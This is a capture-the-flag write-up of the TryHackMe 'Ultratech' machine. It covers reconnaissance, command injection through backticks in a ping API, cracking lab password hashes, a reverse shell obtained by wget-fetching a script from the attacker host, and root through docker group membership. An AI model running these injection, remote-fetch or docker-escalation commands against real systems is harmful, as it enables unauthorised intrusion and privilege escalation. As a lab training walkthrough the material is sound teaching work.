---
tags: ping, api, docker
---
# THM: Ultratech

***Overview**: Ultratech is a THM machine rated as medium. This machine exploits the ping utility being using on a web application via an API to gain foothold. It also exploit the we are running docker privileges as root to escalate privileges on the machine. I hope you enjoy the read.*


## Scanning and Reconnaissance 
- We start by identifying all the open ports quickly using Masscan

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ sudo masscan -p1-65535 10.10.186.176 --rate=1000 -e tun0 > ultratech
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-05-22 14:05:15 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ cat ultratech
Discovered open port 8081/tcp on 10.10.186.176                                 
Discovered open port 21/tcp on 10.10.186.176                                   
Discovered open port 31331/tcp on 10.10.186.176                                
Discovered open port 22/tcp on 10.10.186.176         
```
- then we go ahead to identify the services running on the ports using Nmap

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A -p31331 10.10.186.176
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 10:11 EDT
Nmap scan report for 10.10.186.176
Host is up (0.35s latency).

PORT      STATE SERVICE VERSION
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.19 seconds
                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.186.176        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 14:00 EDT
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.52% done; ETC: 14:00 (0:00:00 remaining)
Nmap scan report for 10.10.186.176
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc668985e705c2a5da7f01203a13fc27 (RSA)
|   256 c367dd26fa0c5692f35ba0b38d6d20ab (ECDSA)
|_  256 119b5ad6ff2fe449d2b517360e2f1d2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.97 seconds
```

- we open port 8081 and gain little information 

![](assets/Ultratech_assets/Pasted%20image%2020230522151036.png)

- when we do a directory scan on that port using FFUF, we identify two (2) paths, which are auth and ping `ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.186.176:8081/FUZZ -e .php,.txt`

![](assets/Ultratech_assets/Pasted%20image%2020230522151602.png)

- Going to the auth path, we see that we have to identify a login and a password

![](assets/Ultratech_assets/Pasted%20image%2020230522151055.png)

- we then go ahead to scan the next port which is port 331331 for open directories using `ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.186.176:31331/FUZZ -e .php,.txt` and we identify the robots.txt on the particular port

![](assets/Ultratech_assets/Pasted%20image%2020230522175932.png)

- we also go ahead to view the port and we can see that the main site is running on this port

![](assets/Ultratech_assets/Pasted%20image%2020230522151814.png)

- when inspecting this site, we discover the JS file, api.js, then when we open it we notice sth interesting, which is is what seems like the ping utility is being used

![](assets/Ultratech_assets/Pasted%20image%2020230522175851.png)

- view the robots.txt file in this port we discover this path /utech_sitemap.txt

![](assets/Ultratech_assets/Pasted%20image%2020230522151835.png)

- then going to that path, we can see 3 other paths

![](assets/Ultratech_assets/Pasted%20image%2020230522151912.png)

- we can view each of the paths

![](assets/Ultratech_assets/Pasted%20image%2020230522152028.png)

- looking at the partners path, we can see a login page

![](assets/Ultratech_assets/Pasted%20image%2020230522152105.png)

- when we keep looking through the web page, we also identify some sensitive information about the possible usernames of the owners of the web application, which are r00t, P4c0 and Sq4l

![](assets/Ultratech_assets/Pasted%20image%2020230522152416.png)

- we also discover the contactus was the email ultratech@yopmail.com
- we also saw this comments in the page source as well, lol!!

![](assets/Ultratech_assets/Pasted%20image%2020230522152847.png)

- if we try invalid credentials on the partners page, we can see that it goes to the auth path on the 8081 port and shows us invalid credentials since we are using invalid credentials

![](assets/Ultratech_assets/Pasted%20image%2020230522153011.png)

- if we try to test that ping functionality we saw earlier in the api.js source file, we can that it actually works

## Exploitation
- we also specify a count for the ping command and see that it also runs, so what if we can find a way to exploit an RCE using this functionality??

![](assets/Ultratech_assets/Pasted%20image%2020230522161633.png)

- after trying multiple characters like `|` and `$`, it seemed like characters like those where being filtered
- But then when we tried the backticks character, we saw that our command got executed, JACKPOT!!!! and we also found what looked like a database

![](assets/Ultratech_assets/Pasted%20image%2020230522162922.png)

- So using the URL below, we were able to execute the `whoami` command, and saw that we are the `www` user 

```
http://10.10.186.176:8081/ping?ip=-c+1+10.10.186.176+`whoami`
```

![](assets/Ultratech_assets/Pasted%20image%2020230522163008.png)

- we also try to view that sqlite database and we discover what looks like the hashes for r00t and the admin user

![](assets/Ultratech_assets/Pasted%20image%2020230522163447.png)

- getting the hash f357a0c52799563c7c7b76c1e7543a32 for r00t and 0d0ea5111e3c1def594c1684e3b9be84 for admin, we went ahead to crack those MD5 hashes
-  we get the password for r00t as n100906

![](assets/Ultratech_assets/Pasted%20image%2020230522163928.png)

- when we attempt to login, we see that we have gotten access and we also get a message
- 
![](assets/Ultratech_assets/Pasted%20image%2020230522165052.png)

- We also get the password for admin is mrsheafy 

![](assets/Ultratech_assets/Pasted%20image%2020230522165144.png)

- when we login with this credential, we also get the same information and the same access
## Foothold
- so we want to get a reverse shell using this URL
```
http://10.10.186.176:8081/ping?ip=-c+1+10.10.186.176+`wget+http://10.8.80.123/script.sh`
```
- we `chmod 777 script.sh` for the script and then execute it 

![](assets/Ultratech_assets/Pasted%20image%2020230522172218.png)

- in our netcat listener, we can see that we have a shell

![](assets/Ultratech_assets/Pasted%20image%2020230522172231.png)

- we can view the /etc/passwd file

![](assets/Ultratech_assets/Pasted%20image%2020230522172332.png)

- we can also see the users the the home directory

![](assets/Ultratech_assets/Pasted%20image%2020230522172532.png)

- we can run the `netstat -tulnp` command to view if there are any private ports in addition to the open ports we found using nmap

![](assets/Ultratech_assets/Pasted%20image%2020230522172756.png)

- we also run the following commands to get a more interactive shell
	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
	- ctrl + z
	- `stty raw -echo; fg`
	- `reset`
	- `xterm`
- But since we see that r00t user exists in the system, we can attempt to use the credentials we found to gain ssh access, since we saw that is running on the sytem

![](assets/Ultratech_assets/Pasted%20image%2020230522173314.png)

-  so we try SSH with r00t and n100906 and BOOM, we have access

![](assets/Ultratech_assets/Pasted%20image%2020230522180819.png)

## Privilege Escalation
- we can run our linpeas script and see the ids of the users in the system, we cans see that our r00t user has docker access

![](assets/Ultratech_assets/Pasted%20image%2020230522174545.png)

- we can also verify that 

![](assets/Ultratech_assets/Pasted%20image%2020230522190525.png)

- we can utilize our gtfobins to see how we can escalate privileges using this

![](assets/Ultratech_assets/Pasted%20image%2020230522184855.png)

- we can then run the command but replace alpine with root `docker run -v /:/mnt --rm -it bash chroot /mnt sh` and boom, we are root

![](assets/Ultratech_assets/Pasted%20image%2020230522184920.png)

- we can view the files in the root directory and see we have a private.txt and see some text

![](assets/Ultratech_assets/Pasted%20image%2020230522185000.png)

- we also see the .ssh directory, so we then view the private key file, and we are done with this challenge

![](assets/Ultratech_assets/Pasted%20image%2020230522185116.png)

Thank you for reading, see you next time!!
Much love.

[Docker group privilege escalation - franks.io - Blog](https://franks.io/posts/docker-group-privilege-escalation/)
